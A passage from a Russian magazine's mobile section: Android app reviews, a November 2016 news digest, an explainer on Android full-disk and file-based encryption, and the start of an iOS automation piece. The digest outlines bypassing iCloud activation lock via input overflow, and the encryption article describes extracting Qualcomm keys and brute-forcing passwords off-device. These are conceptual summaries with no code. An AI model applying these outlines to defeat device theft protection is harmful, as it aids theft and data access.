активируя режим Doze сразу после от-
ключения экрана. Это позволяет суще-
ственно увеличить длительность работы
от одной зарядки, но придется пожертво-
вать большинством уведомлений. Звонки,
СМС и сообщения во многих мессендже-
рах будут приходить как положено, но все                  ForceDoze
остальное, скорее всего, отвалится.                      Платформа:
                                                                    Android 6.0
                                                       Цена:
                                                               бесплатно




OPEN GAPPS
Gapps — это пакет проприетарных при-
ложений Google (маркет, Google Now, ка-
лендарь, Gmail и прочее), который необ-
ходимо прошивать на смартфон после
установки практически любой кастомной
прошивки. Без Gapps ты не сможешь при-
вязать смартфон к своему Google-аккаун-
ту и не будешь иметь доступ к Play Store.
  Раньше  правильный  пакет  Gapps
для своей версии Android, архитектуры
процессора и так далее приходилось ис-
кать по форумам. Позднее появился сайт
Open GApps (http://opengapps.org), на ко-
тором можно всегда найти свежую версию
Gapps в нескольких редакциях (например,
pico включает в себя только Play Store,
а stock — полный набор Google-приложе-
ний).
  Но и это было не совсем удобно. Па-
кет  Gapps  приходилось  перекидывать
на смартфон, перезагружаться в консоль
восстановления и прошивать самостоя-
тельно. Официальное приложение Open
GApps само подберет для тебя правиль-                Open GApps
ный пакет Gapps и не только скачает его                 Платформа:
на смартфон, но и установит. Все, что тре-                     Android 4.4
буется, — установленная консоль восста-                  Цена:
новления (recovery) и права root.                              бесплатно




FINGERPRINT GESTURES
Fingerprint Gestures — не совсем root-при-
ложение.  Точнее, оно может работать
без прав root, но в этом случае его са-
мые вкусные возможности будут отклю-
чены. Говоря по-простому, это прило-
жение, позволяющее «повесить» те или
иные действия на сканер отпечатков паль-
цев. И даже не просто повесить, а задать
разные типы касания, к примеру одиноч-
ное, двойное нажатие, свайп или нажатие
с обязательным распознаванием.
  Самих действий  тут более двух де-
сятков, от простейших «вернуться на до-
машний экран» и «промотать на страни-
цу вниз» до переключения композиций,
включения фонарика и запуска Google
Assistent. Некоторые из них требуют root,
другие Android 6.0. Да и в целом нормаль-
но  Fingerprint  Gestures будет работать
только на «шестерке» или в Android 5.0
или выше, но исключительно в том случае,
если это смартфон Samsung с фирменной
прошивкой.
  Еще  одно   ограничение:   Fingerprint                     Fingerprint
Gestures далеко не всегда правильно рас-                  Gestures
познает   касания   сканера   отпечатков.                 Платформа:
Точнее,  распознает он  их  превосходно,                     Android 5.0
но на некоторых смартфонах может при-                  Цена:
нимать одиночное касание за двойное или                    бесплатно
вообще выполнять действие, привязанное
к двойному касанию, сразу за одиночным.
MOBILE
МОБИЛЬНЫЙ ДАЙДЖЕСТ
  НОЯБРЯGOOGLE PIXEL, ANDROID 7.1
      И УНИВЕРСАЛЬНЫЙ ROOT ДЛЯ ВСЕХ
              СМАРТФОНОВ





                                           Евгений Зобнин
                                                   zobnin@gmail.com





Сегодня в выпуске: CyanogenMod 14.1 и смерть Cyanogen
 Inc., защищенная прошивка от проекта Tor, инструмент
для поиска функций ransomware в Android-приложениях,
обход activation lock в iOS, обсуждение проблем нового ре-
жима шифрования Android 7.0 и недостатков мессенджера
Signal, а также большой тест VPN-приложений на утечки
конфиденциальных данных и троянскую активность.

СОБЫТИЯ
В ноябре проект CyanogenMod начал формирование официальных сборок
версии прошивки 14.1 на базе Android 7.1. В данный момент в число офици-
ально поддерживаемых входят: Nexus 4, 5, 5X, 6, 6P, 7, OnePlus 1, 2, 3, LG G3,
G4, Samsung Galaxy S5, Sony Xperia SP, T, TX, V, Zenfone 2, Moto G. Плюс десят-
ки неофициальных портов на другие смартфоны.
   Скачать прошивку, как обычно, можно с официального сайта. Для установ-
ки нужен разблокированный загрузчик и кастомный recovery. Стоит отметить,
что пока не все фирменные функции CyanogenMod реализованы.
   Между тем Cyanogen Inc., уже заявившая, что не будет больше активно уча-
ствовать в разработке CyanogenMod, продолжает сокращать персонал и гото-
вится к закрытию офиса в Сиэтле. Более того, остается неясной судьба Стива
Кондика, создавшего CyanogenMod. Он все еще продолжает занимать свою
должность в Cyanogen Inc., но, кажется, собирается покинуть компанию и даже
предлагает сообществу создать форк CyanogenMod и сформировать вокруг
нового проекта некоммерческую организацию.
   16 ноября проект Tor представил систему сборки защищенной Android-про-
шивки  на  основе  прошивки  CopperheadOS,  набора  инструментов  Tor
для Android (Orbot и orWall) и других открытых приложений (VLC, Xabber, K-9 Mail,
 Firefox, Signal и других). Любой пользователь может скачать набор скриптов,
которые соберут прошивку и установят на подключенный по USB девайс.
   К сожалению, список поддерживаемых устройств пока очень скуден: Nexus
 9, Nexus 5X и Nexus 6P. Вызвано это тем, что команда разработчиков лежащей
в основе прошивки CopperheadOS просто не имеет ресурсов для поддержки
других устройств. Несколько месяцев назад они даже заявили, что не будут
распространять исходные коды прошивки до тех пор, пока не получат доста-
точное количество инвестиций.
   3 ноября состоялся релиз Maru OS 0.3,
той самой прошивки, позволяющей превра-
 тить Android-смартфон в полноценный на-
стольный ПК при подсоединении к монитору
или телевизору. Как только смартфон под-
ключается к монитору с помощью переход-
ника USB-HDMI SlimPort, на экране монитора
появляется рабочий стол Debian, а смартфон
продолжает работать как обычно.
  В новой версии Android был обновлен
до версии 6.0, появилась функция запуска
Debian в фоне, когда вместо подключения
по HDMI можно использовать VNC-подклю-
чение по сети или SSH-соединение.
   Ну и по традиции еще одна новость про
Samsung. И она опять связана с мегафей-
лом Galaxy Note 7. Чтобы восстановить свою
репутацию и отвоевать ушедших пользова-
 телей, Samsung постарается сделать Galaxy
S8 устройством, от которого просто невоз-
можно будет отказаться. И один из способов
достижения этого — интеграция интеллекту-                                                           Брандмауэр orWall
ального ассистента Viv.
    Viv был создан авторами Siri. И это не просто «еще один голосовой асси-
 стент», а ассистент совершенно нового типа. Он полностью базируется на ней-
росетях и способен обрабатывать даже самые сложные и комплексные запро-
 сы. По сути, в нем даже нет идеи ключевых слов и команд: «поставь будильник
на столько-то», «позвони тому-то». Viv понимает именно смысл команд и может
«дописать саму себя» при необходимости выполнить сложный запрос.
   Тем временем операционная система Sailfish OS, о которой мы уже писали,
получила официальное одобрение на использование в проектах по созданию мо-
бильных устройств для госучреждений и госкорпораций Российской Федерации.

ИНСТРУМЕНТЫ
Nathan — Android-эмулятор, предназначенный для исследования безопасно-
сти приложений. В комплект включены Xposed Framework, модули SSLUnpinning
для обхода certificate pinning, Inspeckage для динамического анализа приложе-
ний и Drozer — фреймворк для пентестинга.

 HelDroid — инструмент для теста приложений на наличие функций ransomware.
 HelDroid анализирует байт-код приложения в поисках таких функций, как шиф-
рование без предупреждения пользователя, блокировка экрана, сообщения
на весь экран, использование прав администратора для вайпа и блокировки
смартфона.

Android (and other) Security resources — небольшая подборка книг, докумен-
тов и инструментов для интересующихся безопасностью и пентестом Android
и приложений для этой платформы.

ПОСМОТРЕТЬ
Xiaomi Mi Mix hands-on: real-life concept phone — быстрый обзор безрамочного
смартфона Xiaomi Mi Mix от Verge. Самое интересное наблюдение: при раз-
мере экрана в 6,4 дюйма Mi Mix имеет практически такой же размер корпуса,
 как 5,5-дюймовый iPhone 7 Plus.

Echo / Google Home infinite loop — бесконечно переговаривающиеся между
собой умные колонки Amazon Echo и Google Home.

A Journey Through Exploit Mitigation Techniques in iOS — доклад с конферен-
ции DEF CON 24 о техниках, используемых в iOS для предотвращения запуска
и корректной работы эксплоитов.

ПОЧИТАТЬ
The limitations of Android N Encryption — статья Мэтью Грина (Matthew Green),
специалиста по криптографии и профессора Университета Хопкинса, о том,
 как работает система шифрования данных в Android 7.0, зачем ее нужно было
кардинально менять и обеспечивает ли она должный уровень безопасности.
Спойлер: нет.
   Проблема в том, что, как только пользователь вводит пин-код или пароль
для разблокировки экрана, Android использует этот пароль для расшифровки
ключа шифрования и хранит его в оперативной памяти вплоть до момента пе-
резагрузки. Если смартфон во включенном состоянии попадет в руки компе-
тентного специалиста c нужным оборудованием, он сможет получить доступ
 к содержимому оперативной памяти и извлечь ключ.

Android Banking Malware Masquerading as Email App Targets German Banks —
разбор банковского трояна Android/Banker.GT!tr.spy, который якобы умеет
деактивировать антивирусы без прав root. Интересен этот документ в первую
очередь тем, что показывает, насколько троян на самом деле примитивен.
   Так называемая функция деактивации в действительности делает следу-
ющее: сервис трояна мониторит запускаемые приложения (с помощью прав
администратора). Как только пользователь открывает банковский клиент,
троян демонстрирует поверх его окна собственное окно (на самом деле это
HTML-страница) с поддельным окном ввода конфиденциальной информации.
Но если запустить один из перечисленных в списке антивирусов, троян делает
очень простую вещь: показывает домашний экран. Другими словами — просто
возвращает пользователя на рабочий стол. Естественно, если антивирус уже
запущен, он спокойно продолжит работать в фоне.





                              Вот так выглядит функция «деактивации антивирусов»

 Test for Adups’ Spyware on Your Phone — & Disable It — инструкция по поиску
и удалению китайского «трояна» Adups, найденного в прошивках некоторых ки-
тайских (и не очень) смартфонов. В частности, Adups предустановлен в смарт-
фоны марки BLU.

 Pixel Security: Better, Faster, Stronger — небольшая заметка разработчиков
Android о безопасности смартфона Google Pixel. Основные моменты:
•  обязательное пофайловое шифрование (FBE);
•  TrustZone — специальный сопроцессор, используемый для хранения клю-
   чей шифрования и отказывающийся расшифровывать файлы, если опера-
   ционная система была модифицирована;
•  использование «железного движка шифрования» (речь, скорее всего, о мо-
   дуле ускорения AES-шифрования в ARMv8), позволяющего на лету шифро-
   вать и расшифровывать данные без проседания скорости чтения/записи
   данных.

Understanding APK packaging in Android Studio 2.2 — еще одна заметка разра-
ботчиков Android. В этот раз речь идет о новой схеме подписи APK-пакетов,
появившейся в Android 7.0 и поддерживаемой Android Studio 2.2. Отныне вме-
сто подписи каждого отдельного файла пакета будет подписываться все со-
держимое пакета целиком, что существенно увеличит скорость инсталляции
приложений.

How  I bypassed apple’s most secure icloud
 activation lock — история о том, как удалось
обойти activation lock в iPad, функцию, тре-
бующую ввести пароль от аккаунта Apple
для включения устройства, если оно будет
украдено.
   Метод оказался банальный — вызвать
переполнение буфера в приложении, отве-
чающем за активацию и запрос пароля, что-
бы уронить его и попасть на рабочий стол.
Интересно другое: при переполнении при-
ложение не падает, а просто зависает и пе-
рестает реагировать на любые действия
пользователя. Но если в этот момент забло-
кировать устройство с помощью Smart Case,
то после разблокировки оно успешно упа-
 дет. Уязвимость исправлена в обновлении
iOS 10 от 16 ноября.

Why I won’t recommend Signal anymore — де-
тальная статья о том, почему мессенджер
 Signal больше не стоит рекомендовать ис-
                                                    Переполнение полей ввода
пользовать в качестве надежного и удобного
средства коммуникации. Основные моменты:
•  Зависимость от Google Cloud Messaging (сервис push-уведомлений). Signal
   не может работать на прошивках без проприетарных сервисов Google, та-
    ких как CopperheadOS или Fire OS (смартфоны и планшеты Amazon), а так-
   же в операционных системах, поддерживающих запуск Android-приложений
    (Sailfish OS, BlackBerry 10). При этом LibreSignal, неофициальная версия
   мессенджера, способная работать без сервисов Google, не может исполь-
   зовать официальные серверы Signal из-за прямого запрета разработчиков.
•  Signal отправляет список контактов пользователя (все номера телефонов)
   на сервер. Это нужно для автоматического определения тех, кто тоже ис-
   пользует Signal, и уведомления об этом пользователя. Signal хеширует номе-
   ра перед отправкой для сохранения приватности пользовательских данных,
   однако, если учесть очень малый объем возможных хешей, которые можно
   получить из одиннадцати цифр (телефонный номер), это очень плохая за-
   щита, которая быстро вскрывается с помощью перебора.
•  Сервер RedPhone (отвечающий за работу функции защищенных звонков)
   закрыт, что не позволяет использовать его третьим лицам. По этой причине
   в том же LibreSignal эта функция просто отключена.

An Analysis of the Privacy and Security Risks of Android VPN Permission-enabled
Apps (pdf) — анализ 283 VPN-приложений для Android на предмет наличия
малвари, манипуляций трафика и другого поведения, нарушающего приват-
ность данных пользователя.
   Оказалось, что 82% приложений получают доступ к важной приватной ин-
формации пользователя, такой как список подключенных аккаунтов и СМС.
38% содержат вирусы и трояны, 16% перенаправляют трафик через смарт-
фоны других пользователей вместо VPN-сервера, 4% создают локальный тун-
нель вместо подключения к удаленному серверу. 18% используют незашиф-
рованный туннель, 66% не туннелируют DNS-запросы. 16% модифицируют
HTTP-трафик, внедряя рекламу и трекеры.

Android malware analysis with Radare: Dissecting the Triada Trojan — вводная ста-
 тья об анализе приложений и троянов для Android с помощью фреймворка
Radare2 на примере знаменитого трояна Triada.

New Reliable Android Kernel Root Exploitation Techniques (pdf) — слайды с пре-
зентации, посвященной техникам получения прав root через эксплуатацию уяз-
вимостей в ядре. Презентация включает в себя рассказ о средствах защиты
от компрометации ядра и методах их обхода.

When CSI meets public wifi: Inferring your mobile phone password via wifi signals —
рассказ о технике перехвата конфиденциальных данных пользователя (на-
пример, пароля экрана блокировки) путем анализа Wi-Fi-сигнала. Соль мето-
да в том, что перемещения пальцев и ладони создают определенные помехи,
проанализировав которые с помощью нейронной сети можно предсказать на-
бранную последовательность символов с точностью от 68 до 81%.
MOBILE





                                                                                        84ckf1r3
                                                                                            84ckf1r3@gmail.com


КРИПТОСТОЙКИЕ
АНДРОИДЫ
КАК РАБОТАЕТ ПОЛНОДИСКОВОЕ
И ПОФАЙЛОВОЕ ШИФРОВАНИЕ В ANDROID



Смартфон и планшет — идеальные сборщики приватной
информации. Ее приходится оберегать от приложений
со шпионскими замашками, троянов-банкеров, обычных
воров, да и просто чрезмерно любопытных коллег. На-
дежно сделать это можно только с помощью шифрова-
ния, но могут ли доступные в Android средства обеспечить
должный уровень защиты? Этой статьей мы начинаем но-
вый цикл о защите данных в Android и сегодня поговорим
о стойкости встроенных в ОС криптографических систем.

ПОЛНОДИСКОВОЕ ШИФРОВАНИЕ (FDE)
Впервые полнодисковое шифрование (full disk encryption — FDE) пытались вне-
дрить еще в планшетной версии Android 3.0 Honeycomb. Тогда вместе с ядром
Linux 2.6.36 в ней появился модуль dm-crypt, обеспечивающий возможность
шифрования на любом блочном устройстве хранения данных (включая NAND
Flash). В универсальной четвертой версии Android шифрование также было
доступно, однако для большинства оно оставалось невостребованной опци-
ей. Из-за отсутствия программных оптимизаций и низкой скорости встраивае-
мых процессоров того времени включение шифрования приводило к падению
производительности ввода-вывода в 6–8 раз на топовых моделях и до 20 раз
на бюджетных.





  Тесты скорости чтения/записи до и после включения шифрования на смартфоне
  OnePlus One под управлением Android 6.0


Исправить ситуацию удалось только с появлением 64-бит-
ных процессоров, имеющих отдельный набор инструкций
для ускорения криптографических вычислений. Поэтому
обязательным шифрование в Android стало только с вер-
сии 5.0, предустанавливаемой на устройства с современ-
ными однокристальными системами.                                               WARNING
  Именно в пятой версии Андроида появился флаг
                                                                        Экосистема Android —forceencrypt fstab, указывающий на необходимость акти-
                                                                              это зоопарк аппаратных
вации шифрования при первом включении устройства.                                                                         платформ, прошивок
Обрати внимание: есть принципиальная разница между     и версий, в каждой
тем, было ли устройство обновлено до Android 5.x или но-     из которых есть свои
                                                                       существенные отличия.вее либо сразу выпускалось с такой версией. Во втором                                                                             Статья описывает лишь
случае шифрование данных будет выполняться всегда.   общие принципы шиф-
В первом варианте (при обновлении) оно останется опци-   рования, реализованные
                                                                            Google в самой ОС.ональным и может быть отключено сбросом до заводских
настроек (factory reset).
  В общем случае для полнодискового шифрования в Android используют-
ся три битовые последовательности: мастер-ключ, соль и пользовательский
пин-код. Мастер-ключ и соль генерируются автоматически, а пин-код вводит-
ся владельцем устройства. Роль пин-кода может также выполнять пароль, гра-
фический ключ или любой другой «секрет» — для процессора это все равно
битовая последовательность, причем довольно короткая.
   Пользовательские данные шифруются мастер-ключом, а соль и пин-код слу-
жат только для того, чтобы хранить сам мастер-ключ в зашифрованном виде.
Поэтому смена пароля не приводит к перешифровке всех данных. Ключ всегда
остается один и тот же (сгенерированный изначально), а новый пароль лишь
меняет его криптографическую оболочку. Разберем эту схему подробнее.
  При первом включении устройство с предустановленной ОС Android 5.0
и выше генерирует псевдослучайный 128-разрядный ключ. Его называют ма-
стер-ключом, или DEK (device encryption key). Помимо DEK, также генерирует-
ся еще одно псевдослучайное 128-битное число (соль), а пользователя про-
сят ввести пароль.
  Именно с помощью DEK в конечном счете шифруются все данные на поль-
зовательском разделе /data. Как именно выглядит этот ключ, владелец устрой-
ства не знает. Он никогда не вводит его и даже не может считать штатными
средствами.
  В ранних версиях Android (до 5.0) мастер-ключ и настройки шифрования
хранились в отдельной незашифрованной структуре crypto footer (упрощенный
аналог LUKS) в начале зашифрованного раздела data. Сам DEX шифровался
другим ключом, вычисляемым на основе пользовательского пароля и соли.
   Такой способ не обеспечивал защиту от брутфорса мастер-ключа на внеш-
них вычислительных системах, поэтому в Android 5.0 и выше появилось новое
требование к производителям устройств: предоставлять на аппаратном уров-
не защищенное хранилище ключей. Дополнительно DEK стал подписывать-
ся с использованием еще одного ключа (HBK — hardware-bound private key),
специфичного для данного устройства. Он захардкожен на этапе производ-
ства и не доступен ни одному пользовательскому процессу.

Как работает FDE

Поэтапно схема создания ключей для шифрования пользовательских данных
в Android 5.0 и выше выглядит так:
1. Гаджет при первом включении генерирует два числа длиной 128 бит. В даль-
  нейшем они используются как мастер-ключ и соль.
2. Пользователя просят задать пароль.
3. На основе введенного пароля функция scrypt запускает формирование пер-
   вого промежуточного ключа (IK1) длиной 256 бит.
4. IK1 дополняется нулями так, чтобы соответствовать по длине аппаратному
   ключу HBK.
5. Модифицированный ключ IK1 подписывается ключом HBK.
6. Подписанный ключ IK1 используется как второй промежуточный ключ (IK2).
7. Функция scrypt запускает формирование третьего промежуточного ключа
    (IK3), используя для его генерации IK2 и соль как входные аргументы.
8. Первые 128 бит IK3 используются как KEK (key encryption key — ключ шиф-
   рования мастер-ключа).
9. Мастер-ключ шифруется ключом KEK по алгоритму AES в режиме сцепления
   блоков шифртекста (CBC). Поскольку в данном режиме одинаковые исход-
  ные блоки дают одинаковый шифртекст, для затруднения атаки на основе
   подобранного шифртекста в качестве данных первого блока используется
   случайная последовательность (вектор инициализации).
10. Зашифрованный мастер-ключ сохраняется в аппаратно изолированной об-
   ласти.

Мастер-ключ используется для шифрования всего содержимого пользова-
тельского раздела во встроенной памяти устройства. Для каждого сектора
генерируется свой вектор инициализации с солью и указанием номера секто-
ра (ESSIV). При вводе пользовательского пароля мастер-ключ расшифровы-
вается, и далее пользовательские данные автоматически расшифровываются
в фоне.
   Недоступность всех ключей для прямого считывания (например,  за-
пущенным на устройстве скриптом) обеспечивается их обработкой толь-
ко внутри изолированной доверенной среды исполнения (trusted execution
environment — TEE). В процессорах архитектуры ARM роль TEE выполняет
TrustZone, которая обеспечивает контроль целостности данных, их защищен-
ное хранение и изолированное выполнение кода. В ней же хранятся и проме-
жуточные значения, вычисляемые функцией формирования ключа.





                                           Схема организации доверенной среды



Как хранение ключа, так и все ключевые криптографические процедуры в со-
временных версиях Android должны выполняться в изолированной среде,
недоступной пользователю и приложениям. На практике же это условие со-
блюдается не всегда, поскольку Android работает на совершенно разных плат-
формах. Концептуально их три: ARM, Intel x86 и MIPS. В каждой из них есть свои
архитектурные ветвления, которые добавляют путаницы. Более того, на базе
одних и тех же ядер (например, ARM Cortex-A53) каждый производитель, обла-
дающий лицензией на архитектуру (architectural license), может сделать свою
версию однокристальной системы с любыми нестандартными свойствами.
  Именно из-за такого разнообразия платформ Google до сих пор не может
обеспечить единый фундамент для шифрования, как это сделала Apple еще
в 2013 году (см. Secure Enclave). Сегодня в устройствах под управлением
Android либо защищенного хранилища ключей нет вовсе, либо оно не имеет
надежной реализации.
   Например,  в  чипах Qualcomm
Snapdragon   используется   соб-
ственная   реализация   аппарат-
но  изолированного  окружения —
QSEE (Qualcomm secure execution
environment). В  нем  запускаются
доверенные обработчики  (trustlets),
включая модуль обработки ключей
(KeyMaster). Как показал этим ле-
том Гэл Беньямини (Gal Beniamini),
в QSEE по факту нет полной аппа-
ратной изоляции. Атакующий может
запустить свой код в пространстве
QSEE. При этом он станет доверен-
ным и автоматически повысит при-
вилегии, после чего сможет считать
через KeyMaster как зашифрован-
ный мастер-ключ, так и захардко-
женный ключ HBK.
   Беньямини опубликовал скрипт
для извлечения ключей с устройств
на  базе  Qualcomm  Snapdragon
и дальнейшие инструкции по под-
бору пользовательского пароля пе-
ребором. Брутфорс не представ-
ляет сложности, так как у основной
массы   пользователей   короткие
пароли.  Поскольку  атака перебо-                  Включаем шифрование
ром выполняется не на смартфоне,
а на любом компьютере с помощью
скрипта, встроенные средства защиты от брутфорса оказываются бессиль-
ны. При внешнем брутфорсе не возникает ни проблем с принудительными за-
держками, ни риска стирания данных после N неудачных попыток.
   Использовать же длинный комплексный пароль на практике слишком неу-
добно. Можно придумать сколь угодно сложный, но представь, что при каждой
разблокировке экрана придется вводить эту абракадабру. Аутентификация
по отпечатку или распознаванию лица мало меняет ситуацию, поскольку это
лишь дополнительные способы авторизации, созданные для удобства. В лю-
бом случае ключ DEK будет зашифрован каким-то коротким битовым набором.
   Сказанное выше не означает, что калифорнийский разработчик однокри-
сталок так уж плох. Просто продукция Qualcomm чаще подвергается сторон-
нему аудиту. В устройствах с другими SoC дела обстоят не лучше. В частности,
уязвимость доверенной среды исполнения (TEE) в однокристалках HiSilicon
подробно разбиралась на прошлогодней конференции Black Hat (pdf).
   Недостатки полнодискового шифрования известны давно. Применительно
к Android и dm-crypt я бы выделил следующие принципиальные моменты:
1. FDE работает на уровне секторов, а значит, совместимо только с дисковы-
  ми файловыми системами. JFFS2, YAFFS и другие работающие напрямую
   с чипами NAND ФС остаются в стороне.
2. Посекторное шифрование сводит на нет все оптимизации, реализованные
   на уровне драйверов файловых систем. Множество приложений постоянно
   пишут логи и считывают свои данные. Это приводит к тому, что устройство
   практически непрерывно расшифровывает секторы и зашифровывает их
   вновь, модифицируя содержимое раздела. Поэтому FDE всегда приводит
   к заметному падению производительности и сокращению времени авто-
   номной работы устройства.
3. FDE не поддерживает проверку подлинности содержимого секторов. Их
   слишком много, и среди них время от времени появляются сбойные, пере-
   назначаемые контроллером в резервную область.
4. Криптографическая схема AES-CBC-ESSIV считается уязвимой к утечке
   данных, так как допускает определение точки их изменения. Она позволяет
   выполнять атаки по типу подмены и перемещения.
5. FDE окажется совершенно бесполезно, если ты лишишься устройства в тот
   момент, когда оно будет разблокировано.

К счастью, полнодисковое шифрование не единственный вариант защиты дан-
ных в Android.

ПОФАЙЛОВОЕ ШИФРОВАНИЕ (FBE)
В Android 7.0 появилась принципиально новая функция — пофайловое шиф-
рование (file based encryption — FBE), которое выполняется с использованием
возможностей файловой системы ext4. Новая реализация шифрования тре-
бует наличия аппаратно изолированной среды (trusted execution environment)
с поддержкой API Keymaster 1.0 (старые версии 0.xx не годятся). Выполне-
ние алгоритма AES процессором должно обеспечивать расшифровку данных
со скоростью не менее 50 Мбайт/с. Это довольно жесткие требования, поэто-
му поддержку Android 7.x пока имеют единичные устройства.

Аппаратная поддержка шифрования

С задачей фонового шифрования в Android гарантированно справляются толь-
ко новые однокристалки с TrustZone и 64-разрядными процессорами архитек-
туры ARMv8-A. Крайне желательно, чтобы их техпроцесс был меньше 28 нм,
иначе существенный нагрев и снижение времени автономной работы станут
очень заметны.
   Если не останавливаться на специфических однокристалках вроде Nvidia
Tegra Parker (четыре ядра Cortex-A57) и процессорах 2014–2015 года от Intel
(Atom Z3560, Z3570, Z3580, Z3590, архитектура x86-64), то в сухом остатке
имеем следующие чипы:
•  Qualcomm Snapdragon 625 (MSM8953), 820 (MSM8996) и 821 (MSM8996
   Pro);
•  Samsung Exynos 7420, 7570, 7870 и 8890;
•  MediaTek Helio X20(MT6797), X25 (MT6797T) и X30;
•  HiSilicon Kirin 650, 950, 955 и 960.

Все они построены на базе 4–8 ядер ARM Cortex-A53 с опциональным допол-
нением в виде 2–4 более мощных ядер Cortex-A57/A72/A73 или их фирменных
модификаций (Qualcomm Kyro, Samsung Mongoose).
   Последние версии Android могут работать и на некоторых других процессо-
рах, однако в таком случае придется сильно жертвовать либо скоростью, либо
продолжительностью работы от одной зарядки. Большинство же других старых
однокристалок в принципе не удовлетворяют минимальным системным требо-
ваниям ОС Android 5.1 и выше. Поэтому смартфоны и планшеты с ними боль-
ше не получат обновлений — это не только маркетинговое решение.



При использовании FBE каждый файл может быть зашифрован своим клю-
чом и расшифрован независимо от остальных. Эта функция работает вместе
с другой новинкой седьмого «Андроида» — прямой загрузкой (Direct Boot).
   Direct Boot API обеспечивает более деликатное отделение приватных дан-
ных от прочих файлов. Он предоставляет ту функциональность, которая была
недоступна при использовании полнодискового шифрования.
  До появления Android 7.0 при активации FDE все данные хранились зашиф-
рованными общим паролем, поэтому смартфоном невозможно было поль-
зоваться до ввода пароля. Теперь же отдельные приложения (например, бу-
дильник) можно сделать доступными прямо на экране блокировки. Они будут
работать без авторизации со своими заранее заданными ограничениями,
а все пользовательские данные тем временем останутся зашифрованными.
  На устройстве с активным пофайловым шифрованием у пользователя появ-
ляется две области хранения данных приложений: зашифрованная отдельным
паролем (Credential Encrypted — CE) и зашифрованная общим ключом устрой-
ства (Device Encrypted — DE). При отключении FBE обе области (CE и DE) оста-
ются открытыми для любого приложения. При активном шифровании файлы
области CE расшифровываются только после ввода поль-
зовательского пароля. Файлы DE могут быть расшифрованы
сразу после загрузки. Заодно раздельные пароли на каждый
аккаунт позволяют создавать на одном устройстве несколь-
ко изолированных пользовательских учеток — например,
для детей и ведущих себя подобно детям сотрудников.                                    WWW
  Шифрование области CE происходит по алгоритму AES,
но уже в другом режиме — XTS. Он разрабатывался специ-    Краткие сведения
ально для шифрования на блочных устройствах и не име-      о шифровании
                                                                                    в Androidет типичных для режима CBC уязвимостей. В частности,
XTS не позволяет определить точку изменения данных,       Реализация
не подвержен утечке данных, устойчив к атакам подмены         TrustZone
                                                                                в однокристалкахи перемещения.                                                               ARM
  С другой стороны, FBE уязвим к side channel атакам, так
как, несмотря на шифрование файлов и их имен, он оставля-      Блог Николая
                                                                                Еленковает открытыми метаданные, что можно использовать для вы-
                                                                           о безопасности
яснения типа хранимой информации и идентификации поль-                                                                                    в Android
зователя устройства.

ВЫВОДЫ
У встроенных в Android систем шифрования есть существенные недостат-
ки. Они уязвимы к классическим видам атак и приводят к заметному сниже-
нию производительности на многих устройствах. Однако лучше использовать
их, чем хранить приватные данные в открытом виде или доверять сторонним
приложениям, не прошедшим аудит. В следующей статье мы поговорим о том,
как сберечь свои данные на карте памяти, и о тех приложениях, которые хоро-
шо справляются с этой задачей.

                           Стойкий пароль
                         шифрования

                                  Большинство  пользователей  зада-
                                       ет короткий пароль на смартфоне
                                   или планшете, поскольку им часто
                                    приходится  его  вводить.  Пробле-
                               ма в том, что в Android использу-
                                      ется один пароль для всех опера-
                                       ций, включая разблокировку экрана
                                  и расшифровку данных. Приложение
                                   EncPassChanger  позволяет устано-
                                      вить раздельные пароли и повысить
                                     криптостойкость  схемы  хранения
                                     мастер-ключа,  которым  шифруют-
                                     ся данные пользователя. Приложе-
                                  ние работает на Android 4.0.3 и выше
                                      (требуется root).



                                          EncPassChanger
MOBILE
ДРЕССИРОВАННЫЙ
СМАРТФОН





   Михаил Филоненко
    mfilonen2@gmail.com


АВТОМАТИЗИРУЕМ РУТИНУ С ПОМОЩЬЮ
WORKFLOW, IFTTT И LAUNCH CENTER PRO


Главное преимущество портативных устройств — мобиль-
ность. Однако она же и затрудняет их использование. Не-
большой размер экрана, отсутствие клавиатуры и много-
оконного режима, а в устройствах Apple и еще целый ряд
ограничений превращают простые с виду задачи в невы-
носимую многочасовую муку. Чтобы избежать таких стра-
даний, придумали средства автоматизации.

Вероятно, каждый продвинутый iOS-пользователь, зная, что система эта пред-
ставляет собой адаптированную под сенсорный экран версию macOS, мо-
жет подумать: «На Mac есть Automator и AppleScript, возможно ли (к примеру,
при наличии джейлбрейка) установить или портировать их на iPhone и iPad?»
Увы, сделать это не получится. Хотя две «яблочные» платформы и имеют сход-
ную архитектуру, они используют принципиально разный подход к организа-
ции работы приложений. Если macOS позволяет программам иметь доступ
ко всем файлам системы, а также получать команды из «Терминала», то iOS
лишает разработчиков софта подобной возможности. Каждая програм-
ма работает изолированно, а принимать команды может фактически только
при прямом пользовательском обращении через собственный интерфейс,
что значительно затрудняет автоматизацию.
   Тем не менее Apple предпринимает шаги, чтобы исправить дело. Благода-
ря технологии Document Picker (общий доступ к документам) и многим другим
решениям управление одной программой при помощи команд от другой все
же реально, а возможности разработчиков внедрять такие функции непрерыв-
но растут. Потому и утилиты для автоматизации имеют шанс стать полезными.

ИНСТРУМЕНТЫ
АВТОМАТИЗАЦИИ
Существует  несколько  ре-
шений  для  автоматизации
на iOS, каждое из них заслу-
живает внимания, а некото-
рые могут применяться в со-
четании с  другими. Самая
раскрученная  утилита,  по-
жалуй, Workflow — при срав-
нительно  небольшой  цене
она обладает мощной функ-
циональностью  и  богатей-
шим  набором  встроенных
решений и схем. Ее конку-
ренты — Launch Center Pro
и IFTTT, отлично зарекомен-
довавшая  себя  на  других
платформах.
   Все они призваны макси-
мально упростить и ускорить
выполнение рутинных задач,
но каждая делает это по-сво-
ему.
   Launch Center Pro — па-                    Главное меню Launch Center Pro
нель быстрого вызова все-
возможных  функций.  При-
ложение      задумывалось
как единый пульт управления
устройством,   заменяющий
интерфейс  остальных  про-
грамм. В большинстве iOS-у-
тилит есть несколько возмож-
ностей для их использования
в Launch Center. Программы
и их отдельные функции запу-
скаются при помощи специ-
ально создаваемой для этого
иконки. Часть опций програм-
мы  требуют  подключения
к соответствующему аккаунту.
   IFTTT позволяет связать
два действия воедино. Име-
ется  большое  количество
встроенных решений, можно
создавать и свои действия.
Множество  функций  пред-
усмотрено как для встроен-
ных    приложений,     так
и для приложений от сторон-
них разработчиков.
                                                          Готовые решения IFTTT
   Создатели  Workflow,  ве-
роятно,  были  вдохновлены
идеями Apple Automator. Ин-
терфейсы  программ  сход-
ны — те же папки действий,
визуальный конструктор. Ко-
нечно, количество действий
ограничено   разработчика-
ми iOS, но и имеющийся на-
бор  операций  впечатляет.
К примеру, есть возможность
добавлять иконки действий
Workflow  на  рабочий  стол
и магазин готовых скриптов.

